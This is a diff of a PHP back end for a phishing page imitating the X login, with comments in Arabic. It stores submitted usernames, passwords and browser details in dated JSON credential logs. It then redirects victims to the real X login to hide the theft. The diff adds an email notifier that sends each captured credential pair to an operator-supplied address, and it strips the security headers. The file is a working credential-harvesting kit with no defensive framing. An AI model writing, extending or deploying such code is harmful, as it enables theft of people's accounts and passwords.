@@ -1,25 +1,21 @@
 <?php
-// تعطيل عرض الأخطاء
 error_reporting(0);
 ini_set('display_errors', 0);
 
-// رؤوس الأمان
-header('X-Content-Type-Options: nosniff');
-header('X-Frame-Options: DENY');
-header('X-XSS-Protection: 1; mode=block');
-
-// تأكد من أن Replit يدعم الجلسات
+// تأكد من تفعيل الجلسات
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
 
-// معالجة بيانات التسجيل
+// نظام الإشعارات
+require_once 'email_notifier.php';
+
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // تنظيف البيانات
     $username = trim($_POST['username'] ?? '');
     $password = trim($_POST['password'] ?? '');
     
-    // بيانات السجل
+    // بيانات السجل المحسنة
     $log_data = [
         'platform' => 'X',
         'timestamp' => $_POST['timestamp'] ?? date('c'),
@@ -31,27 +27,30 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         'platform_info' => $_POST['platform'] ?? 'N/A',
         'screen_resolution' => $_POST['screen_resolution'] ?? 'N/A',
         'timezone' => $_POST['timezone'] ?? 'N/A',
-        'cookies_enabled' => $_POST['cookies_enabled'] ?? 'N/A',
-        'java_enabled' => $_POST['java_enabled'] ?? 'N/A',
-        'replit_host' => true
+        'referrer' => $_SERVER['HTTP_REFERER'] ?? 'Direct',
+        'host' => 'Replit'
     ];
     
-    // إنشاء مجلد logs إذا لم يكن موجوداً
+    // إنشاء مجلد logs
     if (!is_dir('logs')) {
         mkdir('logs', 0755, true);
     }
     
-    // حفظ البيانات في ملف JSON
+    // حفظ البيانات
     $log_file = 'logs/credentials_' . date('Y-m-d') . '.json';
     $log_entry = json_encode($log_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT) . ",\n";
-    
     file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
+    
+    // 📧 إرسال إشعار بالبريد - إذا كانت البيانات صالحة
+    if ($username && $username !== 'N/A' && $password && $password !== 'N/A') {
+        $notifier = new EmailNotifier("your-email@gmail.com"); // ⚠️ غير هذا إلى بريدك
+        $notifier->sendNotification($log_data);
+    }
     
     // إعادة التوجيه إلى X الحقيقي
     header('Location: https://x.com/i/flow/login');
     exit();
 } else {
-    // إذا لم تكن POST، إعادة إلى الصفحة الرئيسية
     header('Location: index.html');
     exit();
 }
